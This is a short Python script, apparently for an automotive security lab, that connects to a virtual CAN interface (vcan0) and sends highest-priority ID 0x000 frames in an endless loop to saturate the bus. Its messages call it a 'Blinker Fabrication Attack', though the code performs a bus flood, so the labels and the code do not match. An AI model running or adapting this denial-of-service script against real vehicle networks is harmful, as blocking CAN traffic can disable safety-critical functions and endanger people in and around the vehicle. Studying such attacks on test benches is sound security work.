import can

try:
    bus = can.interface.Bus('vcan0', interface='socketcan')
    print("Connected to vcan0. Starting Blinker Fabrication Attack...")
except Exception as e:
    print(f"Error: {e}")
    exit()
    
msg = can.Message(arbitration_id=0x000, data=[0x00]*8, is_extended_id=False)

print("Suspension: Saturating the bus in progress...")
try:
    while True:
        bus.send(msg)
except KeyboardInterrupt:
    print("Attack stopped.")